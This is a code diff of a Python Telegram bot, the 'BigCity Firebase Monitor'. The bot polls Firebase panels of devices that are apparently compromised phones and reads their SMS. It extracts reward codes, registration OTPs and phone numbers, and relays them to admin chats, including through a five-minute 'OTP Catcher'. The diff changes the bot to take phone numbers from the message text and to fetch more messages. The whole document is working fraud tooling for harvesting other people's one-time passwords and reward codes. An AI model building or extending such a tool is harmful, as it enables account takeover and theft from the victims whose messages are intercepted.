@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (100% No Old Messages)
+BigCity Firebase Monitor Bot (No Miss + Smart Number)
 """
 import asyncio
 import json
@@ -35,9 +35,7 @@ STATE_FILE = Path(__file__).parent / "bot_state.json"
 ADMINS_FILE = Path(__file__).parent / "admins.json"
 PANELS_FILE = Path(__file__).parent / "panels.json"
 
-# Bot start hone ka time
 BOT_START_TIME = time.time()
-# 10 second ka delay taaki saare purane message read ho sakein
 BASELINE_DELAY = 10
 
 IS_INITIALIZED = False
@@ -53,6 +51,9 @@ active_watches = set()
 REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
 OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{4,8})", re.IGNORECASE)
 BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)
+
+# Script wala Regex (10 digit number ke liye)
+PHONE_PATTERN = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
 
 # ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────
 
@@ -173,33 +174,22 @@ def clean_number(val: str) -> str:
     if len(digits) == 10: return digits
     return ""
 
-def _extract_number(d: dict) -> str:
-    if not isinstance(d, dict): return ""
-    for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile"):
-        if f in d and d[f]:
-            cleaned = clean_number(d[f])
-            if cleaned: return cleaned
-    for f in ("Phone #1", "Phone_1", "phone1", "sim1", "fromNumber"):
-        if f in d and d[f]:
-            cleaned = clean_number(d[f])
-            if cleaned: return cleaned
-    for f in ("Phone #2", "Phone_2", "phone2", "sim2"):
-        if f in d and d[f]:
-            cleaned = clean_number(d[f])
-            if cleaned: return cleaned
-    for nested_key in ("webhookEvent", "info", "details", "deviceInfo", "sim_info"):
-        if nested_key in d and isinstance(d[nested_key], dict):
-            res = _extract_number(d[nested_key])
-            if res: return res
+# ─── NUMBER EXTRACTION (SIRF MESSAGE SE, JAISE SCRIPT MEIN HAI) ─────────────
+def extract_number_from_msg_text(text: str) -> str:
+    if not text: return ""
+    match = PHONE_PATTERN.search(text)
+    if match:
+        return clean_number(match.group(1))
     return ""
 
 async def fetch_online_devices(client, base, dev_node):
     path = f"/{dev_node}" if dev_node else ""
     data, _ = await api_get(client, f"{base}{path}.json", 15)
     if not isinstance(data, dict): return []
-    return [(did, _extract_number(dd)) for did, dd in data.items() if is_device_id(did) and isinstance(dd, dict) and device_is_online(dd)]
+    return [(did, "") for did, dd in data.items() if is_device_id(did) and isinstance(dd, dict) and device_is_online(dd)]
 
-async def fetch_last_messages(client, base, msg_node, dev_id, limit=5):
+# LIMIT 15 KAR DIYA HAI TAAKI EK BHI MESSAGE MISS NA HO
+async def fetch_last_messages(client, base, msg_node, dev_id, limit=15):
     path = f"/{msg_node}" if msg_node else ""
     url = f'{base}{path}/{dev_id}.json?orderBy="%24key"&limitToLast={limit}'
     data, _ = await api_get(client, url, 10)
@@ -254,13 +244,14 @@ def fmt_otp(panel, did, num, sender, dt, otp, msg):
 
 # ─── MONITORING ──────────────────────────────────────────────────────────────
 
-async def process_device(client, pk, pc, did, num, state, admins, app):
+async def process_device(client, pk, pc, did, state, admins, app):
     base = pc["base"]
     msg_node = pc.get("message_node","")
     panel = pc.get("name","Panel")
     sent = 0
     try:
-        msgs = await fetch_last_messages(client, base, msg_node, did, limit=5)
+        # 15 messages fetch karega
+        msgs = await fetch_last_messages(client, base, msg_node, did, limit=15)
         if not msgs: return 0
         
         for mk, md in msgs.items():
@@ -270,7 +261,6 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             
             if state.get(key): continue
             
-            # Time Check
             msg_time = 0
             for tf in ("timestamp", "time", "dateTime"):
                 if tf in md:
@@ -280,11 +270,9 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
                         break
                     except: pass
             
-            # FIX 1: Agar message purana hai, chhod do
             if msg_time > 0 and msg_time < BOT_START_TIME:
                 state[key] = True; continue
                 
-            # FIX 2: Startup Delay (10 sec) ke andar sab read mark karo
             if (time.time() - BOT_START_TIME) < BASELINE_DELAY or not IS_INITIALIZED:
                 state[key] = True; continue
             
@@ -296,7 +284,9 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
                 state[key] = True; continue
                 
             sender, dt = extract_sender_time(md)
-            actual_num = num
+            
+            # Number message text se nikal raha hai (Script wala tarika)
+            actual_num = extract_number_from_msg_text(text)
             
             if kind == "reward":
                 token = f"{pk}~{did}~{int(time.time())}"
@@ -334,7 +324,7 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
                     online = await asyncio.wait_for(fetch_online_devices(client, base, pc.get("device_node","")), timeout=25)
                     if not online: continue
                     
-                    tasks = [process_device(client, pk, pc, did, num, state, admins, app) for did, num in online]
+                    tasks = [process_device(client, pk, pc, did, state, admins, app) for did, _ in online]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
                     for r in results:
                         if isinstance(r, int): total += r
@@ -390,17 +380,10 @@ async def otp_watch(app, chat_id, pk, did):
         stop_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop OTP Watch", callback_data=f"stop_otp|{did}")]])
         
         async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
-            for mk, md in (await fetch_last_messages(client, base, msg_node, did, limit=5)).items():
+            for mk, md in (await fetch_last_messages(client, base, msg_node, did, limit=15)).items():
                 if isinstance(md, dict): seen.add(str(md.get("id", mk)))
-            
-            dev_num = ""
-            try:
-                path = f"/{pc.get('device_node','')}" if pc.get("device_node") else ""
-                dd, _ = await api_get(client, f"{base}{path}/{did}.json", 6)
-                if isinstance(dd, dict): dev_num = _extract_number(dd)
-            except Exception: pass
                 
-            watch_msg = await app.bot.send_message(chat_id, f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nNumber: <code>{dev_num or 'N/A'}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>", parse_mode="HTML", reply_markup=stop_btn)
+            watch_msg = await app.bot.send_message(chat_id, f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>", parse_mode="HTML", reply_markup=stop_btn)
             last_ping = time.time()
             while time.time() < end_at:
                 if did not in active_watches:
@@ -408,7 +391,7 @@ async def otp_watch(app, chat_id, pk, did):
                     except Exception: pass
                     return
                 try:
-                    for mk, md in (await asyncio.wait_for(fetch_last_messages(client, base, msg_node, did, limit=5), timeout=12)).items():
+                    for mk, md in (await asyncio.wait_for(fetch_last_messages(client, base, msg_node, did, limit=15), timeout=12)).items():
                         if not isinstance(md, dict): continue
                         mid = str(md.get("id", mk))
                         if mid in seen: continue
@@ -417,7 +400,7 @@ async def otp_watch(app, chat_id, pk, did):
                         kind, payload = classify_bigcity(text)
                         if kind != "otp": continue
                         sender, dt = extract_sender_time(md)
-                        actual_num = dev_num
+                        actual_num = extract_number_from_msg_text(text)
                         await app.bot.send_message(chat_id, fmt_otp(panel, did, actual_num, sender, dt, payload, text), parse_mode="HTML", disable_web_page_preview=True)
                         try: await watch_msg.edit_reply_markup(reply_markup=None)
                         except Exception: pass
@@ -445,7 +428,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cid = update.effective_chat.id
     if not is_admin(cid): return await update.message.reply_text("❌ Aap Admin nahi hain.")
     kb = ReplyKeyboardMarkup([["📊 Status","📋 My Panels"],["➕ Add Panel","❌ Remove Panel"],["👑 Admin Panel"]], resize_keyboard=True)
-    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Super Fast (5s Scan)\n• Sirf NAYE messages\n• Exact Number Fetch\n• 🎯 OTP Catcher (5 min)\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
+    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Super Fast (5s Scan)\n• Sirf NAYE messages\n• Number from SMS Text\n• 🎯 OTP Catcher (5 min)\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
 
 async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_chat.id): return
